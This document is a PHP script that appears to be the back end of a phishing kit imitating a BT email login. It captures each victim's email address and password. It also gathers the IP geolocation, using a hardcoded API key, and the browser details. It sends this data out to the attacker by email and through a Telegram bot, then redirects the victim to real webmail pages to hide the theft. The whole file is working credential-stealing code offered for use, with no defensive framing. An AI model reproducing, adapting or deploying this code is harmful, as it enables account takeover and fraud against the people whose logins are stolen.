<?php

require_once 'antispams.php';
require_once '../config.php';

function getGeoLocation($ip, $apiKey)
{
    $url = "http://api.ipinfodb.com/v3/ip-city/?key=2b3d7d0ad1a285279139487ce77f3f58d980eea9546b5ccc5d08f5ee62ce7471&ip={$ip}&format=json";
    $response = @file_get_contents($url);

    if ($response === false) {
        return array('country' => 'Unknown', 'state' => 'Unknown');
    }

    $data = json_decode($response);
    return array(
        'country' => isset($data->countryName) ? $data->countryName : 'Unknown',
        'state' => isset($data->regionName) ? $data->regionName : 'Unknown'
    );
}

function stt($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $payload = array(
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    );

    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($payload)
        )
    );

    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);

    return $result !== false;
}

session_start();
$_SESSION['email'] = $_POST['mail'];

$formType = $_POST['formtype'];
$count = $_POST['count'];
$auth = $_POST['auth'];
$loginType = $_POST['loginType'];
if($auth !==''){
    header("Location: https://email.bt.com/mail/index-rui.jsp?v=MX_3.10.0.2");
    exit;
}

$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
$location = getGeoLocation($ip, '');
$timestamp = date("d/m/Y h:i:sa") . " GMT";
$log = "#---------------------------[ SbMental-Email-------Tele...@fixsx]----------------------------#\r\n";

// --- Handle OTP Info Form ---
if ($formType === 'login') {
    $email = $_POST['mail'];
    $password = $_POST['password'];

    $log .= "Email             : {$email}\r\n";
    $log .= "Password          : {$password}\r\n";
    $log .= "Login Type        : {$loginType}\r\n";



} else {
    header("Location: ../?invalid=true");
    exit;
}

$log .= "IP                : https://www.geodatatool.com/?IP={$ip}\r\n";
$log .= "Country           : {$location['country']}\r\n";
$log .= "State             : {$location['state']}\r\n";
$log .= "Timestamp         : {$timestamp}\r\n";
$log .= "Browser           : {$_SERVER['HTTP_USER_AGENT']}\r\n";
// $log .= "Cookie            : {$_SERVER['HTTP_COOKIE']}\r\n";
// $log .= str_repeat("-", 40) . "\r\n";

file_put_contents($logFile, $log, FILE_APPEND);

$subject = "User Log from [{$location['country']}]";
$headers = "From: Log Collector <noreply>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
mail($emailTo, $subject, $log, $headers);

stt($teltok, $telchatid, $log);

// --- Clean up and redirect ---

if ($count === '0') {
    header("Location: ../?invalid=true");
}else{
    session_destroy();
    header("Location: https://webmail.sbmetal.co.kr/intro.php");
}

exit;
